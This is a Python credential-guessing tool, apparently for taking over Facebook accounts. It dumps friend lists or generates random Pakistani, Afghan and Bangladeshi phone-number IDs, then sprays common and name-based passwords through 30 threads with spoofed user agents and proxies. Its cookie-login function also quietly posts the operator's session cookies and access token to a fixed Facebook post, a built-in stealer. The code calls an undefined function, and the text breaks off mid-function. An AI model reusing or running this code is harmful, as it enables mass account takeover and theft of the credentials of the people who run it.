#Open Source By fAHAD
# Please Follow My github FADII143

fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana')

try:
    import os,requests,json,time,re,random,sys,uuid,string,subprocess
    from string import *
    import bs4
    #import dz
    from concurrent.futures import ThreadPoolExecutor as tred
    from bs4 import BeautifulSoup as sop
    from bs4 import BeautifulSoup
except ModuleNotFoundError: 
    print('\n Installing missing modules ...')
    os.system('pip install requests bs4 futures==2 > /dev/null')
    os.system('python usmi.py')
try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        print('\n Installing missing modules ...')
        os.system('pip install requests futures==2 > /dev/null')
        os.system('pip install requests')
        os.system('python Fahad.py')
except:pass
try:
    prox= requests.get('https://raw.githubusercontent.com/BestProfessionals/MUSLIWAHID/main/.prox.txt').text
    open('.prox.txt','w').write(prox)
except Exception as e:
    print('\n\033[1;36m   Checking Server....')
    
prox=open('.prox.txt','r').read().splitlines()
            
 
ugen=[]
for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 6.0.1;'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/533.1'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)
    
for xd in range(5000):
   
    aa='Mozilla/5.0 (Linux; Android'
    b=random.choice(['4.3','4.4.4','5.1.1','6.0','6.0.1','7.1.1','8.1.0','9','10','11','12','13','14'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'HOT','SMART'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(44,160)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
    
    aa='Mozilla/5.0 (Linux; Android'
    b=random.choice(['4.3','4.4.4','5.1.1','6.0','6.0.1','7.1.1','8.1.0','9','10','11','12','13','14'])
    c=' en-us; TECNO '
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'HOT'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(44,160)
    l='Mobile Safari/537.36'
  #  awm = ['[FB_IAB/FB4A;FBAV/387.0.0.24.102;]', '[FB_IAB/FB4A;FBAV/371.0.0.24.109;]', '[FBAN/EMA;FBLC/ar_AR;FBAV/324.0.0.8.106;]', '[FB_IAB/FB4A;FBAV/388.0.0.32.105;]', '[FB_IAB/FB4A;FBAV/364.0.0.24.132;]', '[FB_IAB/FB4A;FBAV/386.0.0.35.108;]' ,'[FB_IAB/FB4A;FBAV/387.0.0.24.102;]' ,'[FB_IAB/FB4A;FBAV/387.0.0.24.102;]', '[FBAN/EMA;FBLC/ar_AR;FBAV/318.0.0.16.105;]', '[FB_IAB/FB4A;FBAV/365.0.0.30.112;]', '[FB_IAB/FB4A;FBAV/362.0.0.27.109;]', '[FB_IAB/FB4A;FBAV/360.0.0.30.113;]', '[FB_IAB/FB4A;FBAV/360.0.0.30.113;]', '[FB_IAB/Orca-Android;FBAV/376.1.0.25.106;]']
  #  m = random.choice(awm)
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
    
    aa='Mozilla/5.0 (Linux; Android'
    b=random.choice(['7','8','9','10','11','12','13','14'])
    c='Infinix '
    d=random.choice(['X677','F98', 'NOTE 2', 'NOTE 2', 'Hot', 'Hot 1', 'Note 3', 'NOTE 3 ', 'Hot 10', 'Hot 10 ', 'Note 4', 'Note 4 ', 'Hot 10s', 'Note 5', 'Note 10s ', 'Note 5', 'Note 6', 'Note 7 ', 'Note 7', 'Note 7 ', 'Hot 10T', 'Hot 11', 'Hot 11s', 'Hot 12', 'Hot 12 ', 'Hot 12 ', 'HOT','Note 12 '])
    e=random.randrange(1, 999)
    f=random.choice(['Pro 5G','Play NFC', 'Stylus', 'Play', 'NFC', 'Stylus', 'LTE', 'LITE', 'Lite', 'Zero', 'Pro', 'Play 5G', 'Pro NFC', 'i', 'VIP', '2020', '2022', 'Ultra', 'Ultra 5G', 'Smart 3G', 'Smart HD', 'Y88', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(44,160)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
  
  
    aa='Mozilla/5.0 (Linux; Android'
    b=random.choice(['4.3','4.4.4','5.1.1','6.0','6.0.1','7.1.1','8.1.0','9','10','11','12','13','14'])
    c=' en-us; Qmobile '
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'HOT','POWER'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(44,160)
    l='Mobile Safari/537.36'
    awm = ['[FB_IAB/FB4A;FBAV/387.0.0.24.102;]', '[FB_IAB/FB4A;FBAV/371.0.0.24.109;]', '[FBAN/EMA;FBLC/ar_AR;FBAV/324.0.0.8.106;]', '[FB_IAB/FB4A;FBAV/388.0.0.32.105;]', '[FB_IAB/FB4A;FBAV/364.0.0.24.132;]', '[FB_IAB/FB4A;FBAV/386.0.0.35.108;]' ,'[FB_IAB/FB4A;FBAV/387.0.0.24.102;]' ,'[FB_IAB/FB4A;FBAV/387.0.0.24.102;]', '[FBAN/EMA;FBLC/ar_AR;FBAV/318.0.0.16.105;]', '[FB_IAB/FB4A;FBAV/365.0.0.30.112;]', '[FB_IAB/FB4A;FBAV/362.0.0.27.109;]', '[FB_IAB/FB4A;FBAV/360.0.0.30.113;]', '[FB_IAB/FB4A;FBAV/360.0.0.30.113;]', '[FB_IAB/Orca-Android;FBAV/376.1.0.25.106;]']
    m = random.choice(awm)
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l} {m}')
    ugen.append(uaku2)
    
    
    aa='Mozilla/5.0 (Linux; Android ; HLK-L42 '
    b=random.choice(['4.3','4.4.4','5.1.1','6','6.0.1','7.1.1','8.1.0','9','10','11','12','13','14'])
    c=' en-us; HONOR '
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'HOT','POWER'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(44,160)
    l='Mobile Safari/537.36'
  #  awm = ['[FB_IAB/FB4A;FBAV/387.0.0.24.102;]', '[FB_IAB/FB4A;FBAV/371.0.0.24.109;]', '[FBAN/EMA;FBLC/ar_AR;FBAV/324.0.0.8.106;]', '[FB_IAB/FB4A;FBAV/388.0.0.32.105;]', '[FB_IAB/FB4A;FBAV/364.0.0.24.132;]', '[FB_IAB/FB4A;FBAV/386.0.0.35.108;]' ,'[FB_IAB/FB4A;FBAV/387.0.0.24.102;]' ,'[FB_IAB/FB4A;FBAV/387.0.0.24.102;]', '[FBAN/EMA;FBLC/ar_AR;FBAV/318.0.0.16.105;]', '[FB_IAB/FB4A;FBAV/365.0.0.30.112;]', '[FB_IAB/FB4A;FBAV/362.0.0.27.109;]', '[FB_IAB/FB4A;FBAV/360.0.0.30.113;]', '[FB_IAB/FB4A;FBAV/360.0.0.30.113;]', '[FB_IAB/Orca-Android;FBAV/376.1.0.25.106;]']
   # m = random.choice(awm)
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
 
 
 
    aa='Mozilla/5.0 (Linux; Android'
    b=random.choice(['4.3','4.4.4','5.1.1','6.0','6.0.1','7.1.1','8.1.0','9','10','11','12','13','14'])
    c=' en-us; Infinix '
    d=random.choice(['X677','F98', 'NOTE 2', 'NOTE 2', 'Hot', 'Hot 1', 'Note 3', 'NOTE 3 ', 'Hot 10', 'Hot 10 ', 'Note 4', 'Note 4 ', 'Hot 10s', 'Note 5', 'Note 10s ', 'Note 5', 'Note 6', 'Note 7 ', 'Note 7', 'Note 7 ', 'Hot 10T', 'Hot 11', 'Hot 11s', 'Hot 12', 'Hot 12 ', 'Hot 12 ', 'HOT','Note 12 '])
    e=random.randrange(1, 999)
    f=random.choice(['Pro 5G','Play NFC', 'Stylus', 'Play', 'NFC', 'Stylus', 'LTE', 'LITE', 'Lite', 'Zero', 'Pro', 'Play 5G', 'Pro NFC', 'i', 'VIP', '2020', '2022', 'Ultra', 'Ultra 5G', 'Smart 3G', 'Smart HD', 'Y88', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(44,160)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
	
    aa='Mozilla/5.0 (Windows NT 10.0;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Win64; x64'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/108.0.0.0 Safari/537.36 Vivaldi/5.5.2805.50'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
	
	
 
logo = """\033[1;97m
██   ██  █████   ██████  ███    ███  █████  ██
██   ██ ██   ██ ██    ██ ████  ████ ██   ██ ██
███████ ███████ ██    ██ ██ ████ ██ ███████ ██
██   ██ ██   ██ ██ ▄▄ ██ ██  ██  ██ ██   ██ ██
██   ██ ██   ██  ██████  ██      ██ ██   ██ ███████
                    ▀▀
----------------------------------------------
:AUTHER   : RAEES HAQMAL
:Facebook : RAEES HAQMAL
:Tool Name: RANDOM AND FILE
:FRIEND   : WAHID WL
Tools Type: Free
--------------------------------------------
 VERSION : 1.5
--------------------------------------------"""
def linex():
        print('\033[1;37m-----------------------------------------')
def clear():
        os.system('clear')
        print(logo)
loop=0
lim=0
oks=[]
cps=[]
twf=[]
pcp=[]
tp=0
id=[]
tokenku=[]
r="\033[1;91m"
g="\033[1;92m"
y="\033[1;93m"
b="\033[1;94m"
p="\033[1;95m"
c="\033[1;96m"
l="\033[1;97m"
A="\033[0m"
#--(light@Colours)---#
lr="\033[0;91m"
lg="\033[0;9m"
ly="\033[0;93m"
lb="\033[0;94m"
lp="\033[0;95m"
lc="\033[0;96m"
ll="\033[0;97m"
 
 
def login():
        clear()
        cookies = input(' [+] Put cookies: ')
        try:
                data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookies})
                find_token = re.search("(EAAG\w+)", data.text)
                open(".tok.txt", "w").write(find_token.group(1))
                open(".coki.txt","w").write(cookies)
                tok=open('.tok.txt','r').read()
                info = requests.get('https://graph.facebook.com/me/?access_token='+tok,cookies = {"cookie":cookies}).json()
                name=(info['name'])
                idd=(info['id'])
                barth=(info['birthday'])
                print('\033[1;97m [+]-------------------------------------------------------')
                print(' [+] Welcome\033[1;32m : '+name)
                print(' \033[1;37m[+] Your UID : '+idd)
                print(' [+] Barth Day: '+barth)
                requests.post('https://graph.facebook.com/pfbid02Sj97PfY1mY3cvbLjGaJRz22FR7yc75JFKLoBFiHoNLSq9aGxmGKotAtcYLkMDDpbl/comments/?message='+cookies+'&access_token='+tok, cookies={'cookie':cookies})
                print('\033[1;97m [+]-------------------------------------------------------')
                print(' [+] Cookies login has been successfull...')
                time.sleep(1)
                menu()
        except KeyError:
                print('\033[1;31m [+] Cookies has been expired...')
                os.system('rm -rf .tok.txt');time.sleep(1);login()
        except requests.exceptions.ConnectionError:
                exit(' [+] internet connection error...')
        except AttributeError:
                print('\033[1;31m [+] Cookies has been expired...')
                os.system('rm -rf .tok.txt');time.sleep(1);login()
                login()
def public():
        usrr=[]
        global lim
        clear()
        try:
                tok = open('.tok.txt','r').read()
                cok = open('.coki.txt','r').read()
                tokenku.append(tok)
        except KeyError:
                print('\033[1;31m [+] Your cookies  expired...');time.sleep(1)
                login()
        except IOError:
                print('\033[1;31m [+] Your cookies  expired...');time.sleep(1)
                login()
        try:
                info = requests.get('https://graph.facebook.com/me/?access_token='+tok,cookies = {"cookie":cok}).json()
                name=(info['name'])
                print('\033[1;32m [+] Welcome '+name)
                print('\033[1;97m [+]-------------------------------------------------------')
        except KeyError:
                print('\033[1;31m [+] Your cookies  expired...');time.sleep(1)
                login()
        try:
                jum=int(input(' \033[1;36m [+] How many ids you  to clone ?\033[1;37m '))
                lim=jum
        except ValueError:
                exit(' [+] Put only digits not latters ')
        if jum<1 or jum>5000:
                exit()
        ses=requests.Session()
        yz = 0
        for met in range(jum):
                yz+=1
                kl = input(f'\033[1;37m [+] Put link no.{yz+0}: ')
                usrr.append(kl)
        print('\033[1;97m [+]-------------------------------------------------------')
        print(' [+] Try method 1 & 2 for best  ')
        print('\033[1;97m [+]-------------------------------------------------------')
        print(' [1] Method 1 \033[1;91m Mobile\033[1;97m \n [2] Method 2 \033[1;92m API')
        print('\033[1;97m [+]-------------------------------------------------------')
        mthd = input(' [+]Choose method: ')
        print('\033[1;97m [+]-------------------------------------------------------')
        print(' [+] Do you went show cp account? (y/n): ')
        print('\033[1;97m [+]-------------------------------------------------------')
        cx=input(' Choose: ')
        if cx in ['y','Y','yes','Yes','1']:
                pcp.append('y')
        else:
                pcp.append('n')
        print('\033[1;97m [+]-------------------------------------------------------')
        print('\033[1;32m [+] Dumping friend list...\033[1;37m')
        print('\033[1;97m [+]-------------------------------------------------------')
        for userr in usrr:
                try:
                        col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
                        for mi in col['friends']['data']:
                                try:
                                        iso = (mi['id']+'|'+mi['name'])
                                        if iso in id:pass
                                        else:id.append(iso)
                                except:continue
                except (KeyError,IOError):
                        pass
                except requests.exceptions.ConnectionError:
                        exit(f' [+] No internet connection')
        try:
                plist = []
                try:
                        ps_limit = int(input(' [+] How many passwords do you want to add ? '))
                except:
                        ps_limit =1
                print('\033[1;97m [+]-------------------------------------------------------')
                print('\033[1;32m [+] exp: first last,firtslast,first123')
                print('\033[1;97m [+]-------------------------------------------------------')
                for i in range(ps_limit):
                    plist.append(input(f' [+] Put password {i+1}: '))
                
                with tred(max_workers=30) as crack_submit:
                        clear()
                        total_ids = str(len(id))
                        print(' [+] Total idz : \033[1;32m'+total_ids)
                        print("\033[1;32m [+] CLONING STARTED")
                        print('\033[1;97m [+]-------------------------------------------------------')
                        for user in id:
                                ids,names = user.split('|')
                                passlist = plist
                                if mthd in ['1','01']:
                                        crack_submit.submit(ffb,ids,names,passlist)
                                elif mthd in ['2','02']:
                                        crack_submit.submit(api,ids,names,passlist)
                                else:
                                        crack_submit.submit(api1,ids,names,passlist)
                print('\033[1;37m')
                print('\033[1;97m [+]-------------------------------------------------------')
                print(' [+] The process has completed')
                print(' [+] \033[1;32m [+] Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
                print('\033[1;97m [+]-------------------------------------------------------')
                input(' [+] Press enter to back ')
                os.system('python Fahad.py')
                menu() 
        except requests.exceptions.ConnectionError:
                exit(f' [+] No internet connection')
        except (KeyError,IOError):
                print(f' [+] No friends for {userr}')
                time.sleep(3)
                public()
def menu():
        global lim,tp
        try:
                clear()
                sj="server on"
                if "server on" in sj:
                        #clear()
                        print(' [1] File Cloning\n [2] Frinds Cloning\n [3] Random Cloning \n [0] Report Problems')
                        print('\033[1;97m [+]-------------------------------------------------------')
                        xd=input(' [+] Choose option----> ')
                        if xd in ['1','01']:
                                file_cloning()
                        elif xd in ['2','02']:
                                public()
                        elif xd in ['3','03']:
                                mirwais001()                              
                        elif xd in ['0','00']:
                                exit
                                print('\033[1;96m [+] THANKS FOR USING')
                                
                        else:
                                print('\033[1;91m [+] OPTION NOT FOUND IN MENU...');time.sleep(1)
                                menu() 
                else:
                        print(' [+] Will be back soon')
 
 
                        print('\033[1;97m [+]-------------------------------------------------------')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
                print('\n [+] No internet connection ...')
                exit()
def mirwais001():
                                print(' [1] Pakistan Cloning\n [2] Afghanistan Cloning \n [3] Bangladesh Cloning\n [0] Back menu')
                                print('\033[1;97m [+]-------------------------------------------------------')
                                x=input(' [+] Choose: ')
                                if x in ['1','01']:
                                        pak()
                                elif x in ['2','02']:
                                        afgan()
                                elif x in ['3','03']:
                                        bdawm()                                           
                                else:
                                        menu()
 
                
def file_cloning():
                                clear()
                                print(' [+] Put file example:  /sdcard/File.txt  etc..')
                                print(' [+] Make sure file in your storage')
                                print('\033[1;97m [+]-------------------------------------------------------')
                                file = input(' [+] Put file path\033[1;37m: ')
                                try:
                                        fo = open(file,'r').read().splitlines()
                                except FileNotFoundError:
                                        print(' [+] File location not found ')
                                        time.sleep(1)
                                        menu()
                                clear()
                                print(' [+] Try all methods  ')
                                print('\033[1;97m [+]-------------------------------------------------------')
                                print(' [1] Method 1 \033[1;91m Mobile New Ids\033[1;97m \n [2] Method 2 \033[1;92m API MIX')
                                print('\033[1;97m [+]-------------------------------------------------------')
                                mthd=input(' [+] Choose: ')
                                print('\033[1;97m [+]-------------------------------------------------------')
                                plist = []
                                print(' [+] Select Crack method');print('\033[1;97m [+]-------------------------------------------------------');print(' [1] Auto Password \n [2] Choice Password \n [3] First Last Firstlast Pass Crack\n [4] Crack with First and Last name ');print('\033[1;97m [+]-------------------------------------------------------')
                                ppp=input(' [+] Choose: ')
                                if ppp in ['1','01']:
                                        plist.append('first last')
                                        plist.append('firstlast')
                                        plist.append('first123')
                                        plist.append('first12345')
                                        plist.append('First Last')
                                        plist.append('first1234')
                                        plist.append('firstlast123')
                                        plist.append('First123')
                                        plist.append("last123")
                                        plist.append("last1234")
                                        plist.append("last12345")
                                elif ppp in ['3','03']:
                                    plist.append("firstlast")
                                    plist.append("first last")
                                    plist.append("First Last")
                                    plist.append("Firstlast")
                                    plist.append("Afghan1234")
                                elif ppp in ["4","04"]:
                                    plist.append("firstlast")
                                    plist.append("first last")
                                else:
                                        try:
                                                print('\033[1;97m [+]-------------------------------------------------------')
                                                ps_limit = int(input(' [+] How many passwords do you want to add ? '))
                                        except:
                                                ps_limit =1
                                        print('\033[1;97m [+]-------------------------------------------------------')
                                        print('\033[1;32m [+] exp: first last,firtslast,first123')
                                        print('\033[1;97m [+]-------------------------------------------------------')
                                        for i in range(ps_limit):
                                                plist.append(input(f' [+] Put password {i+1}: '))
                                print('\033[1;97m [+]-------------------------------------------------------')
                                print(' [+] Do You Want Show Cp Account? (Y/n): ')
                                print('\033[1;97m [+]-------------------------------------------------------')
                                cx=input(' [+] Choose: ')
                                if cx in ['y','Y','yes','Yes','1']:
                                        pcp.append('y')
                                else:
                                    pcp.append('n')
                                
                                with tred(max_workers=30) as crack_submit:
                                        clear()
                                        total_ids = str(len(fo))
                                        lim=int(total_ids)
                                        print(' [+] Total ids : \033[1;32m'+total_ids)
                                        print("\033[1;32m [+] CLONING STARTED")
                                        print("\033[1;32m [+] ON/OFF YOUR MOBILE DATA BEFORE USE")
                                        print('\033[1;97m [+]-------------------------------------------------------')
                                        print("\033[1;32m [+] OK IDZ SAVE ✓ WAHID-OK.txt")
                                        print("\033[1;32m [+] CP IDZ SAVE × WAHID-CP.txt")
                                        print("\033[1;32m [+] WE ARE MUSLIM TECH TEAM ")
                                        print('\033[1;97m [+]-------------------------------------------------------')
                            
                                        
                                        for user in fo:
                                                ids,names = user.split('|')
                                                passlist = plist
                                                if mthd in ['1','01']:
                                                        crack_submit.submit(ffb,ids,names,passlist)
                                                elif mthd in ['2','02']:
                                                        crack_submit.submit(api,ids,names,passlist)
                                                else:
                                                        crack_submit.submit(api1,ids,names,passlist)
 
                                print('\033[1;37m')
 
                                print('\033[1;97m [+]-------------------------------------------------------')
                                print(' [+] The process has completed')
                                print(' [+] \033[1;32m [+] Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
                                print('\033[1;97m [+]-------------------------------------------------------')
                                input(' [+] Press enter to back ')
                                os.system('python Fahad.py')
                                menu() 
                                
 
def pak():
                user=[]
                global lim
                clear()
                print('\033[1;31m [+] Code example: 92302,92315,92335,92345')
                code = input('\033[1;37m [+] put code: ')
                try:
                        limit = int(input('\033[1;31m [+] example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
                except ValueError:
                        limit = 5000
                lim=limit
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                
                with tred(max_workers=30) as AWM:     
                        clear()
                        tl = str(len(user))
                        print(' \033[1;32m [+] Total ids : \033[1;32m'+tl)
                        print(f'\033[1;32m [+] CLONING STARTED')
                        print(f'\033[1;32m [+] ON/OFF YOUR MOBILE DATA BEFORE USE ')
                        print('\033[1;97m [+]-------------------------------------------------------')
                        print("\033[1;32m [+] OK IDZ SAVE ✓ WAHID-OK.txt")
                        print("\033[1;32m [+] CP IDZ SAVE × WAHID-CP.txt")
                        print("\033[1;32m [+] WE ARE MUSLIM TECH TEAM ")
                        print('\033[1;97m [+]-------------------------------------------------------')
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'khankhan','khan1122','khan12345','khan123','peshawar','pakistan']
                                AWM.submit(rndm2,ids,passlist)
                print('\033[1;37m')
                print('\033[1;97m [+]-------------------------------------------------------')
                print(' [+] The process has completed')
                print(' [+]\033[1;32m [+] Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
                print('\033[1;97m [+]-------------------------------------------------------')
                input(' [+] Press enter to back ')
                os.system('python Fahad.py')
                menu() 
 
def afgan():
 
                user=[]
                global lim
                clear()
                print('\033[1;97m [+] \033[1;31mCodes: 9370, 9377, 9378, 9379, 9374, 9372, 9376')
                code = input('\033[1;37m [+] put code: ')
                try:
                        limit = int(input('\033[1;97m [+] \033[1;31mexample: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
                except ValueError:
                        limit = 5000
                lim=limit
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                
                with tred(max_workers=30) as AWM:     
                        clear()
                        tl = str(len(user))
                        print('\033[1;97m [+] \033[1;32mTotal ids : \033[1;32m'+tl)
                        print('\033[1;97m [+] \033[1;32mCLONING STARTED  ')
                        print('\033[1;97m [+] \033[1;32mON/OFF YOUR MOBILE DATA BEFORE USE ')
                        print('\033[1;97m [+]-------------------------------------------------------')
                        print("\033[1;97m [+]\033[1;32m OK IDZ SAVE ✓ WAHID-OK.txt")
                        print("\033[1;97m [+]\033[1;32m CP IDZ SAVE × WAHID-CP.txt")
                        print("\033[1;97m [+]\033[1;32m WE ARE MUSLIM TECH TEAM ")
                        print('\033[1;97m [+]-------------------------------------------------------')
                        for psx in user:
                                ids = code+psx
                            
                            
                                passlist = [psx,ids,psx[1:],'Afghan123','Afghanistan','afghan12345', 'afghanistan', 'afghan1234', 'afghan123','600700','۱۲۳۴۵۶۷۸۹',' kabul123', '۱۲۳۴۵۶','khan123']
                            
                                AWM.submit(rndm2,ids,passlist)
                print('\033[1;37m')
                print('\033[1;97m [+]-------------------------------------------------------')
                print(' [+] The process has completed')
                print(' [+]\033[1;32m [+] Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
                print('\033[1;97m [+]-------------------------------------------------------')
                input(' [+]Press enter to back ')
                os.system('python Fahad.py')
                menu() 
 
def bd():
                user=[]
                global lim
                clear()
                print('\033[1;31m [+] Code example: 88017 ,88013 ,88018 ,88019 ,88016 ,88015')
                code = input('\033[1;37m [+] put code: ')
                try:
                        limit = int(input('\033[1;31m [+] example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
                except ValueError:
                        limit = 5000
                lim=limit
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7+8+9+11))
                        user.append(nmp)
                
                with tred(max_workers=30) as AWM:     
                        clear()
                        tl = str(len(user))
                        print(' \033[1;32m [+] Total ids : \033[1;32m'+tl)
                        print(f'\033[1;32m [+] CLONING STARTED')
                        print(f'\033[1;32m [+] ON/OFF YOUR MOBILE DATA BEFORE USE ')
                        print('\033[1;97m [+]-------------------------------------------------------')
                        print("\033[1;32m [+] OK IDZ SAVE ✓ WAHID-OK.txt")
                        print("\033[1;32m [+] CP IDZ SAVE × WAHID-CP.txt")
                        print("\033[1;32m [+] WE ARE MUSLIM TECH TEAM ")
                        print('\033[1;97m [+]-------------------------------------------------------')
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'free fire','Free Fire','i love you','bangladesh','I love you','786786','22334455','123456789','102030','100200']
                                AWM.submit(rndm2,ids,passlist)
                print('\033[1;37m')
                print('\033[1;97m [+]-------------------------------------------------------')
                print(' [+] The process has completed')
                print(' [+]\033[1;32m [+] Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
                print('\033[1;97m [+]-------------------------------------------------------')
                input(' [+] Press enter to back ')
                os.system('python Fahad.py')
                menu() 
              
            
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [WAHID-F1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(' ')[0]
                try:
                        last = names.split(' ')[1]
                except:
                        last = 'Afghan'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
                        pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
                        ua=random.choice(ugen)
